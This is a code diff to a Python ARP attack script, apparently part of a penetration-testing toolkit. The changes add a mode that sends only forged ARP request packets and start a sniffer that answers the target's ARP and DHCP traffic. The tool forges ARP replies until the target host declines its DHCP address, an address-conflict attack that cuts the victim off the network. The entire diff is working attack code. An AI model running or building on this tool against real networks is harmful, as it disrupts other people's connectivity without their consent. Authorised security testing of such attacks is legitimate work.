@@ -68,6 +68,7 @@ parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address',
 parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
 
 parser.add_argument('-a', '--answers', action='store_true', help='Send only ARP answers')
+parser.add_argument('-r', '--requests', action='store_true', help='Send only ARP requests')
 parser.add_argument('-p', '--packets', type=int, help='Number of ARP answer packets (default: 10)', default=10)
 parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
 
@@ -135,26 +136,35 @@ def send_arp_reply(request):
     global _make_conflict
     global _arp_response
     global _sock
+    global args
 
-    if 'ARP' in request.keys():
-        if request['ARP']['sender-ip'] == _target_ip_address and request['ARP']['sender-mac'] == _target_mac_address:
-            Base.print_info("Send IPv4 Address Conflict ARP response to: ",
-                            _target_ip_address + " (" + _target_mac_address + ")")
-            _make_conflict = False
-            _sock.send(_arp_response)
+    try:
+        if not args.answers and not args.requests:
+            if 'ARP' in request.keys():
+                if request['ARP']['sender-ip'] == _target_ip_address and \
+                        request['ARP']['sender-mac'] == _target_mac_address:
+                    Base.print_info("Send IPv4 Address Conflict ARP response to: ",
+                                    _target_ip_address + " (" + _target_mac_address + ")")
+                    _make_conflict = False
+                    _sock.send(_arp_response)
 
-    if 'DHCP' in request.keys():
-        if request['DHCP'][53] == 4:
-            Base.print_success("DHCP Decline from: ",
-                               _target_ip_address + " (" + _target_mac_address + ")",
-                               " IPv4 network conflict created successful!")
-            exit(0)
+        if 'DHCP' in request.keys():
+            if request['DHCP'][53] == 4:
+                Base.print_success("DHCP Decline from: ", _target_ip_address +
+                                   " (" + request['Ethernet']['source'] + ")",
+                                   " IPv4 network conflict created successful!")
+                exit(0)
+
+    except KeyboardInterrupt:
+        _sock.close()
+        Base.print_info("Exit")
+        exit(0)
 # endregion
 
 
 # region ARP Sniffer
 def arp_sniffer():
-    Base.print_info("Sniff ARP request from: ", str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
+    Base.print_info("Sniff ARP or DHCP request from: ", str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
     Sniff.start(protocols=['ARP', 'IP', 'UDP', 'DHCP'], prn=send_arp_reply,
                 filters={"Ethernet": {"source": _target_mac_address}})
 # endregion
@@ -179,8 +189,14 @@ if __name__ == "__main__":
                                          target_ip=Base.get_netiface_random_ip(_current_network_interface))
         # endregion
 
+        # region Start ARP sniffer
+        TM.add_task(arp_sniffer)
+        # endregion
+
         # region Send only ARP reply packets
         if args.answers:
+            Base.print_info("Send only ARP response packets to: ",
+                            str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
             for _ in range(_number_of_packets):
                 _sock.send(_arp_response)
                 sleep(0.5)
@@ -188,12 +204,19 @@ if __name__ == "__main__":
             _sock.close()
         # endregion
 
+        # region Send only ARP request packets
+        elif args.requests:
+            Base.print_info("Send only Multicast ARP request packets to: ",
+                            str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
+            for _ in range(_number_of_packets):
+                _sock.send(_arp_request)
+                sleep(0.5)
+
+            _sock.close()
+        # endregion
+
         # region Send broadcast ARP request packets
         else:
-            # region Start ARP sniffer
-            TM.add_task(arp_sniffer)
-            # endregion
-
             # region Start send ARP requests
             while _make_conflict:
                 if _current_number_of_packets == _number_of_packets:
